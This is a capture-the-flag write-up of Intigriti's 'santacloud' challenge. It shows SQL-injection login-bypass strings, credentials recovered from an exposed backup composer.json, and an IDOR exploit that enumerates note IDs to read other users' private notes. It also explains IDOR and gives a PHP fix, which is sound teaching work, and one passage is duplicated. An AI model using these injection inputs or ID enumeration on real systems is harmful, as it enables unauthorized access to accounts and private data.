# santacloud - intigriti

<figure><img src="./images/articles/ctf-santacloud-intigriti/01.png" alt=""><figcaption></figcaption></figure>

At the very beginning, when you land on the main page, you’ll notice a few important notes:

* Should leverage a vulnerability on the challenge page.
* Shouldn't be self-XSS or related to MiTM attacks.
* Should require no user interaction.

This basically means the goal **is not XSS**. The goal is to compromise the application **without any user interaction**.

So any bug that requires user interaction is either rejected or considered **out of scope** for this challenge.

Alright, let’s open the first page.

We’re greeted with a **login page**.

So what’s the first thing that comes to mind?

<figure><img src="./images/articles/ctf-santacloud-intigriti/02.png" alt=""><figcaption></figcaption></figure>

**SQL Injection**, right?

Yeah, that was my first thought too — and I actually tried it.

I attempted payloads like these in the `username` field:

```jsx
admin'--
administrator'--
ADMIN'--
admin'OR 1=1--'
```

But all attempts failed. Nothing worked which means there’s **no SQL injection** here, at least not in this part of the app.

We’re greeted with a **login page**.

So what’s the first thing that comes to mind?

**SQL Injection**, right?

Yeah, that was my first thought too  and I actually tried it.

I attempted payloads like these in the `username` field:

```jsx
admin'--
administrator'--
ADMIN'--
admin'OR 1=1--'
```

But all attempts failed.\
Nothing worked . which means there’s **no SQL injection** here, at least not in this part of the app

***

### Analyzing the JavaScript Code

Let’s take a look at the JS logic:

```jsx
const response = await fetch('/api/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    },
    body: JSON.stringify({ username, password })
});
```

What’s happening here?

* A **POST request** is sent to `/api/login`
* Credentials are sent as **JSON** `{ username, password }`
* The response is awaited and parsed

If the response is successful and returns a `token`:

1. The token and user data are stored in **localStorage**
2. The token is also saved as a **cookie**
3. The user is redirected to `/dashboard`

So at this point, we need **one of two things**:

* Either get the **token**
* Or find a valid **username & password**

***

### The Hint That Changed Everything

While browsing **X (Twitter)**, I found a very strong hint:

> *"Bug bounty hunters who spend time in reconnaissance are always rewarded well for their efforts..."*

<figure><img src="./images/articles/ctf-santacloud-intigriti/03.png" alt=""><figcaption></figcaption></figure>

This hint was huge.

So I started digging deeper:

* Source code
* JavaScript files
* Anything exposed

Nothing worked.

Then it hit me , **keep it simple**.

&#x20;`robots.txt`

<figure><img src="./images/articles/ctf-santacloud-intigriti/04.png" alt=""><figcaption></figcaption></figure>

And yep… that was the first real step to the solution.

The file contained:

```jsx
User-agent: *
Allow: /

# Disallow indexing of sensitive config files
Disallow: /package.json
Disallow: /backup.json
Disallow: /artisan
Disallow: /.env
Disallow: /.env.local
Disallow: /composer.json
Disallow: /composer.json*
Disallow: /composer.json~
```

Most of these returned **404 Not Found**.

Except one.

**But!!!! ⇒ composer.json\~**

And this was its content:

```jsx
{
    "name": "intigriti-challenges/santacloud",
    "type": "project",
    "description": "SantaCloud - Supply Chain Portal",
    "version": "13.3.7",
    "keywords": ["laravel", "gifts", "christmas"],
    "license": "MIT",
    "config": {
        "admin-access": {
            "username": "elf_supervisor",
            "password": "CookiesAndMilk1337",
            "api-endpoint": "http://santacloud.intigriti.io/login",
        },
        "env": {
            "secret": "INTIGRITI{019b118e-e563-7348",
            "ttl": 3600
        }
    },
    "require": {
        "php": "^8.2",
        "laravel/framework": "^10.0",
        "firebase/php-jwt": "^6.10"
    }
}
```

What we care about here is obvious:

```jsx
"username": "elf_supervisor",
"password": "CookiesAndMilk1337",
```

<figure><img src="./images/articles/ctf-santacloud-intigriti/05.png" alt=""><figcaption></figcaption></figure>

## What Now?

In bug bounty / pentesting, the rule is simple:

> **Try everything and collect as much information as possible.**

Let’s enumerate available directories:

```jsx
/dashboard
/inventory
/map
/profile
/notes
```

Now let’s watch the API traffic using Burp and list endpoints:

```jsx
/api/gifts
/api/notes
```

***

### First API: `/api/gifts`

It returned data like:

* `gift_description`
* `id`
* `status`

But no flag here.

```jsx
{"success":true,"viewing_user":"elf_supervisor","user_id":2,"total_gifts":21,"gifts":[{"id":4,"user_id":2,"recipient_name":"0xReindeer","region":"Antwerp, Belgium","gift_description":"10.0 submission to submit on Intigriti","status":"pending","priority":10}]}
```

Nothing useful.

***

### Second API: `/api/notes`

This one was interesting.

<figure><img src="./images/articles/ctf-santacloud-intigriti/06.png" alt=""><figcaption></figcaption></figure>

#### 1 - Create New Note

Request body:

```jsx
{
	"title":"black",
	"content":"Test For Swag!",
	"is_private":true
}
```

Response:

```jsx
{
"success":true,
"note":{
	"user_id":2,
	"title":"black",
	"content":"Test For Swag!",
	"is_private":true,
	"id":60
	}
}
```

We now know:

* `user_id`
* `note_id`

***

#### 2 - Delete Note

```jsx
DELETE /api/notes/60
```

Response:

```jsx
{"success":true,"message":"Note deleted"}
```

Works as expected.

***

#### 3 - Edit / View Note

```jsx
GET /api/notes/61
```

Response:

```jsx
{
"success":true,
"note":{
	"user_id":2,
	"id":60
	}
}
```

And here’s where it clicked.

**This smells like IDOR.**

But!!! What is IDOR ??&#x20;

***

### What is IDOR?

**IDOR (Insecure Direct Object Reference)** happens when a user can access another user’s data just by changing an ID in the request.

Example:

```http
GET /api/notes/61
```

If changing the ID returns someone else’s data → **IDOR vulnerability**.

#### Why does it happen?

* No ownership check on the backend
* The server trusts user-supplied IDs

#### How to fix it (PHP example):

```php
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE id = ? AND owner_id = ?"
);
$stmt->execute([$id, $_SESSION['user_id']]);
```

More reading:

* <https://portswigger.net/web-security/access-control/idor>
* <https://www.intigriti.com/blog/news/idor-a-complete-guide-to-exploiting-advanced-idor-vulnerabilities>

***

### Exploitation Phase

Instead of accessing our own note, let’s try:

```jsx
GET /api/notes/1
```

Response:

```jsx
{"success":true,"note":{"id":1,"user_id":1,"title":"Q4 Distribution Strategy"}}
```

Boom , Another user’s private note.

Now we brute-force IDs until we hit gold.

And finally:

```jsx
GET /api/notes/3
```

Response:

```jsx
{
"success":true,
"note":{
"title":"The Secret Key",
"content":"INTIGRITI{019b118e-e563-7348-a377-c1e5f944bb46}"
}
}
```

***

Thanks **Intigriti** for this awesome challenge ❤️
